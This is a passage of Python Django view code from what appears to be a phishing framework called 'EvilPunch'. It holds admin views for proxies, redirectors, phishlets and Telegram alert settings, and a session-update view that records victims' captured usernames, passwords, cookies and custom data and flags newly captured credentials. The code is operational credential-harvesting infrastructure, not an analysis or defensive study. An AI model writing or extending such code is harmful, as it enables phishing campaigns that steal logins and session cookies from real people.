            'error': 'Session not found'
        }, status=404)
    except Exception as e:
        return JsonResponse({
            'success': False,
            'error': str(e)
        }, status=500)


# Proxy Management Views
@login_required
@user_passes_test(is_admin)
def proxy_list_view(request: HttpRequest) -> HttpResponse:
    """List all proxies"""
    proxies = Proxy.objects.all()
    return render(request, "proxy_list.html", {"proxies": proxies})


@login_required
@user_passes_test(is_admin)
def proxy_create_view(request: HttpRequest) -> HttpResponse:
    """Create a new proxy"""
    if request.method == 'POST':
        try:
            proxy = Proxy(
                name=request.POST.get('name'),
                proxy_type=request.POST.get('proxy_type'),
                host=request.POST.get('host'),
                port=int(request.POST.get('port')),
                username=request.POST.get('username', ''),
                password=request.POST.get('password', ''),
                is_active=request.POST.get('is_active') == 'on'
            )
            proxy.full_clean()
            proxy.save()
            messages.success(request, f'Proxy "{proxy.name}" created successfully!')
            return redirect('proxy_list')
        except Exception as e:
            messages.error(request, f'Error creating proxy: {str(e)}')
    
    return render(request, "proxy_form.html", {"instance": None})


@login_required
@user_passes_test(is_admin)
def proxy_edit_view(request: HttpRequest, pk: uuid.UUID) -> HttpResponse:
    """Edit an existing proxy"""
    try:
        proxy = Proxy.objects.get(pk=pk)
    except Proxy.DoesNotExist:
        messages.error(request, 'Proxy not found.')
        return redirect('proxy_list')
    
    if request.method == 'POST':
        try:
            proxy.name = request.POST.get('name')
            proxy.proxy_type = request.POST.get('proxy_type')
            proxy.host = request.POST.get('host')
            proxy.port = int(request.POST.get('port'))
            proxy.username = request.POST.get('username', '')
            proxy.password = request.POST.get('password', '')
            proxy.is_active = request.POST.get('is_active') == 'on'
            proxy.full_clean()
            proxy.save()
            messages.success(request, f'Proxy "{proxy.name}" updated successfully!')
            return redirect('proxy_list')
        except Exception as e:
            messages.error(request, f'Error updating proxy: {str(e)}')
    
    return render(request, "proxy_form.html", {"instance": proxy})


@login_required
@user_passes_test(is_admin)
def proxy_delete_view(request: HttpRequest, pk: uuid.UUID) -> HttpResponse:
    """Delete a proxy"""
    try:
        proxy = Proxy.objects.get(pk=pk)
        proxy_name = proxy.name
        proxy.delete()
        messages.success(request, f'Proxy "{proxy_name}" deleted successfully!')
    except Proxy.DoesNotExist:
        messages.error(request, 'Proxy not found.')
    except Exception as e:
        messages.error(request, f'Error deleting proxy: {str(e)}')
    
    return redirect('proxy_list')


@login_required
@user_passes_test(is_admin)
def proxy_toggle_view(request: HttpRequest, pk: uuid.UUID) -> JsonResponse:
    """Toggle proxy active status"""
    try:
        proxy = Proxy.objects.get(pk=pk)
        old_status = proxy.is_active
        proxy.is_active = not proxy.is_active
        proxy.save()
        
        # Send notification about status change
        try:
            from .notify import notify_proxy_status_change
            notify_proxy_status_change(proxy.name, "active" if proxy.is_active else "inactive")
        except Exception as e:
            # Log notification error but don't fail the main operation
            import logging
            logger = logging.getLogger(__name__)
            logger.warning(f"Failed to send proxy status notification: {e}")
        
        return JsonResponse({
            'success': True,
            'proxy_id': pk,
            'is_active': proxy.is_active,
            'message': f"Proxy {'activated' if proxy.is_active else 'deactivated'} successfully"
        })
    except Proxy.DoesNotExist:
        return JsonResponse({
            'success': False,
            'error': 'Proxy not found'
        }, status=404)
    except Exception as e:
        return JsonResponse({
            'success': False,
            'error': str(e)
        }, status=500)


@login_required
@user_passes_test(is_admin)
def test_proxy_view(request: HttpRequest) -> JsonResponse:
    """Test proxy connectivity"""
    if request.method != 'POST':
        return JsonResponse({'success': False, 'error': 'Only POST method allowed'}, status=405)
    
    try:
        # Parse JSON data from request
        data = json.loads(request.body)
        
        # Extract proxy configuration
        host = data.get('host', '').strip()
        port = data.get('port', '').strip()
        proxy_type = data.get('proxy_type', '').strip()
        username = data.get('username', '').strip()
        password = data.get('password', '').strip()
        
        # Validate required fields
        if not host or not port or not proxy_type:
            return JsonResponse({
                'success': False, 
                'error': 'Host, port, and proxy type are required'
            }, status=400)
        
        # Validate port
        try:
            port_num = int(port)
            if not (1 <= port_num <= 65535):
                return JsonResponse({
                    'success': False, 
                    'error': 'Port must be between 1 and 65535'
                }, status=400)
        except ValueError:
            return JsonResponse({
                'success': False, 
                'error': 'Port must be a valid number'
            }, status=400)
        
        # Test proxy connectivity
        import socket
        import time
        
        try:
            # Create socket connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)  # 10 second timeout
            
            # Attempt to connect
            start_time = time.time()
            result = sock.connect_ex((host, port_num))
            connection_time = time.time() - start_time
            
            sock.close()
            
            if result == 0:
                # Connection successful
                return JsonResponse({
                    'success': True,
                    'message': f'Proxy connection successful! Connected to {host}:{port} in {connection_time:.2f}s',
                    'connection_time': round(connection_time, 2),
                    'host': host,
                    'port': port_num,
                    'proxy_type': proxy_type
                })
            else:
                # Connection failed
                return JsonResponse({
                    'success': False,
                    'error': f'Connection failed to {host}:{port}. Error code: {result}'
                })
                
        except socket.gaierror as e:
            return JsonResponse({
                'success': False,
                'error': f'Hostname resolution failed: {str(e)}'
            })
        except socket.timeout:
            return JsonResponse({
                'success': False,
                'error': f'Connection timeout to {host}:{port}'
            })
        except Exception as e:
            return JsonResponse({
                'success': False,
                'error': f'Connection error: {str(e)}'
            })
            
    except json.JSONDecodeError:
        return JsonResponse({
            'success': False,
            'error': 'Invalid JSON data'
        }, status=400)
    except Exception as e:
        return JsonResponse({
            'success': False,
            'error': f'Unexpected error: {str(e)}'
        }, status=500)


@login_required
@user_passes_test(is_admin)
def notification_settings_view(request: HttpRequest) -> HttpResponse:
    """View and edit notification settings"""
    try:
        # Get or create notification settings
        settings_obj, created = NotificationSettings.objects.get_or_create(
            id=NotificationSettings.objects.first().id if NotificationSettings.objects.exists() else None
        )
        
        if request.method == 'POST':
            # Update settings
            settings_obj.telegram_bot_token = request.POST.get('telegram_bot_token', '').strip()
            settings_obj.telegram_chat_id = request.POST.get('telegram_chat_id', '').strip()
            settings_obj.is_active = request.POST.get('is_active') == 'on'
            
            try:
                settings_obj.full_clean()
                settings_obj.save()
                messages.success(request, 'Notification settings updated successfully!')
                return redirect('notification_settings')
            except ValidationError as e:
                for field, errors in e.message_dict.items():
                    for error in errors:
                        messages.error(request, f'{field}: {error}')
        
        context = {
            'settings': settings_obj,
        }
        return render(request, 'notification_settings.html', context)
        
    except Exception as e:
        messages.error(request, f'Error loading notification settings: {str(e)}')
        return redirect('dashboard')



@login_required
@user_passes_test(is_admin)
def test_notification_view(request: HttpRequest) -> JsonResponse:
    """Test notification system by sending a test message"""
    if request.method != 'POST':
        return JsonResponse({'success': False, 'error': 'Only POST method allowed'}, status=405)
    
    try:
        from .notify import send_notification
        
        # Send test notification
        test_message = "🧪 This is a test notification from EvilPunch! If you receive this, your notification system is working correctly."
        success = send_notification(test_message, "test")
        
        if success:
            return JsonResponse({
                'success': True,
                'message': 'Test notification sent successfully!'
            })
        else:
            return JsonResponse({
                'success': False,
                'error': 'Failed to send test notification. Check your configuration.'
            })
            
    except Exception as e:
        return JsonResponse({
            'success': False,
            'error': f'Error sending test notification: {str(e)}'
        }, status=500)


@login_required
@user_passes_test(is_admin)
def update_session_data_view(request: HttpRequest, session_id: int) -> JsonResponse:
    """Update session data and send notification"""
    if request.method != 'POST':
        return JsonResponse({'success': False, 'error': 'Only POST method allowed'}, status=405)
    
    try:
        session = Session.objects.get(id=session_id)
        
        # Parse JSON data from request
        data = json.loads(request.body)
        
        # Track what changed for notifications
        changes = {}
        new_credentials_captured = False
        
        # Update username if provided
        if 'username' in data:
            new_username = data['username'].strip()
            if new_username != session.captured_username:
                changes['username'] = {
                    'old': session.captured_username,
                    'new': new_username
                }
                # Check if this is the first time capturing username
                if not session.captured_username and new_username:
                    new_credentials_captured = True
                session.captured_username = new_username
        
        # Update password if provided
        if 'password' in data:
            new_password = data['password'].strip()
            if new_password != session.captured_password:
                changes['password'] = {
                    'old': session.captured_password,
                    'new': new_password
                }
                # Check if this is the first time capturing password
                if not session.captured_password and new_password:
                    new_credentials_captured = True
                session.captured_password = new_password
        
        # Update cookies if provided
        if 'cookies' in data:
            new_cookies = data['cookies']
            if new_cookies != session.captured_cookies:
                changes['cookies'] = {
                    'old': session.captured_cookies,
                    'new': new_cookies
                }
                # Check if this is the first time capturing cookies
                if not session.captured_cookies and new_cookies:
                    new_credentials_captured = True
                session.captured_cookies = new_cookies
        
        # Update custom data if provided
        if 'custom_data' in data:
            new_custom = data['custom_data']
            if new_custom != session.captured_custom:
                changes['custom_data'] = {
                    'old': session.captured_custom,
                    'new': new_custom
                }
                # Check if this is the first time capturing custom data
                if not session.captured_custom and new_custom:
                    new_credentials_captured = True
                session.captured_custom = new_custom
        
        # Update capture status
        if session.captured_username or session.captured_password or session.captured_cookies or session.captured_custom:
            session.is_captured = True
        
        # Persist via model helper for consistency
        if changes:
            session.update_session_data(**{k.replace('custom_data','captured_custom').replace('cookies','captured_cookies').replace('username','captured_username').replace('password','captured_password'): v['new'] for k, v in changes.items()})
        
        # Do not send notifications here to avoid duplicates.
        # Notifications are handled in `Session.update_captured_data()`.
        
        return JsonResponse({
            'success': True,
            'message': 'Session updated successfully',
            'changes': changes,
            'session': {
                'id': str(session.id),
                'captured_username': session.captured_username,
                'captured_password': session.captured_password,
                'captured_cookies': session.captured_cookies,
                'captured_custom': session.captured_custom,
                'is_captured': session.is_captured,
                'updated': session.updated.isoformat()
            }
        })
        
    except Session.DoesNotExist:
        return JsonResponse({
            'success': False,
            'error': 'Session not found'
        }, status=404)
    except json.JSONDecodeError:
        return JsonResponse({
            'success': False,
            'error': 'Invalid JSON data'
        }, status=400)
    except Exception as e:
        return JsonResponse({
            'success': False,
            'error': str(e)
        }, status=500)


# Redirector Management Views
@login_required
@user_passes_test(is_admin)
def redirector_list_view(request: HttpRequest) -> HttpResponse:
    """List all redirectors"""
    items = Redirectors.objects.all()
    return render(request, "redirector_list.html", {"items": items})


@login_required
@user_passes_test(is_admin)
def redirector_create_view(request: HttpRequest) -> HttpResponse:
    """Create a new redirector"""
    if request.method == "POST":
        form = RedirectorForm(request.POST)
        if form.is_valid():
            form.save()
            messages.success(request, "Redirector created successfully.")
            return redirect("redirector_list")
    else:
        form = RedirectorForm()
    return render(request, "redirector_form.html", {"form": form})


@login_required
@user_passes_test(is_admin)
def redirector_edit_view(request: HttpRequest, pk: uuid.UUID) -> HttpResponse:
    """Edit an existing redirector"""
    instance = Redirectors.objects.get(pk=pk)
    if request.method == "POST":
        form = RedirectorForm(request.POST, instance=instance)
        if form.is_valid():
            form.save()
            messages.success(request, "Redirector updated successfully.")
            return redirect("redirector_list")
    else:
        form = RedirectorForm(instance=instance)
    return render(request, "redirector_form.html", {"form": form, "instance": instance})


@login_required
@user_passes_test(is_admin)
def redirector_delete_view(request: HttpRequest, pk: uuid.UUID) -> HttpResponse:
    """Delete a redirector"""
    if request.method != "POST":
        return JsonResponse({"error": "POST required"}, status=405)
    
    try:
        instance = Redirectors.objects.get(pk=pk)
        redirector_name = instance.name
        
        # Check if any phishlets are using this redirector
        phishlets_using = Phishlet.objects.filter(redirector=instance)
        if phishlets_using.exists():
            phishlet_names = [p.name for p in phishlets_using]
            return JsonResponse({
                "error": f"Cannot delete redirector '{redirector_name}' as it is being used by phishlets: {', '.join(phishlet_names)}"
            }, status=400)
        
        instance.delete()
        return JsonResponse({"ok": True, "message": f"Redirector '{redirector_name}' deleted successfully."})
    except Redirectors.DoesNotExist:
        return JsonResponse({"error": "Redirector not found."}, status=404)
    except Exception as e:
        return JsonResponse({"error": f"Error deleting redirector: {str(e)}"}, status=500)
